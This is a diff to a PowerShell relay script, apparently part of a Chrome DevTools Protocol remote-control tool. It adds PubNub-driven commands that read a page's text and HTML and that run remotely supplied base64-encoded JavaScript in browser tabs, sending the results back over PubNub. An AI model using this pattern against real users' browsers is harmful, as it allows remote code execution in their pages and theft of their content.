@@ -431,6 +431,29 @@ $script:getTargets_callback = {
     $script:pubnubws.SendPBMessage($resultout)
 }
 
+$script:evaluate_callback = {
+    param(
+        [object]$Response, [PSCDP]$cdpobj
+    )
+
+    $cmd = $Response.cmd
+
+    $resultout = @{
+        builtincmd=$cmd.builtincmd
+        source="pscdp.relay.ps1"
+        destination=$cmd.source
+        cmdid=$cmd.cmdid
+        resultid=$(Get-Random -Minimum 10000000 -Maximum 99999999)
+        ts=$(Get-Timestamp)
+        result=$null
+        targetId=$target.targetId
+    }
+
+    $resultout['result'] = $Response.result.result.value
+
+    $script:pubnubws.SendPBMessage($resultout)
+}
+
 function Transform-PSCustomObject($obj) {
     $ht = @{}
 
@@ -566,7 +589,54 @@ function Process-PubNubEvent {
 
         return
     } elseif ( $cmd.builtincmd -eq "GetTargetText" ) {
+        
+        $pbmsg = @{ 
+            method="Runtime.evaluate"; 
+            params=@{ 
+                expression="document.body.innerText"
+                returnByValue=$true
+            }; 
+            target=$target; 
+            callback=$script:evaluate_callback
+        }
 
+        $script:clientws.AddQueue( $pbmsg )
+        
+        return
+
+    } elseif ( $cmd.builtincmd -eq "ExecEvaluate" ) {
+
+        $expression = $cmd.expression
+        $expression = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($expression))
+
+        $pbmsg = @{ 
+            method="Runtime.evaluate"; 
+            params=@{ 
+                expression=$expression
+                returnByValue=$true
+            }; 
+            target=$target; 
+            callback=$script:evaluate_callback
+        }
+
+        $script:clientws.AddQueue( $pbmsg )
+
+        return
+    } elseif ( $cmd.builtincmd -eq "GetTargetHTML" ) {
+
+        $pbmsg = @{ 
+            method="Runtime.evaluate"; 
+            params=@{ 
+                expression="document.documentElement.outerHTML"
+                returnByValue=$true
+            }; 
+            target=$target; 
+            callback=$script:evaluate_callback
+        }
+
+        $script:clientws.AddQueue( $pbmsg )
+
+        return
     }
 
     $resultout['result'] = $result
@@ -1350,6 +1420,8 @@ while ( $true ) {
 
     try {
         $script:pubnubws.LogState() # TODO need to check if pubnub connection is active
+
+        # TODO reset the connection if pubnub broadcasts are not going through -- after 5 messages
 
         $script:pubnubws.CheckSocket()
 
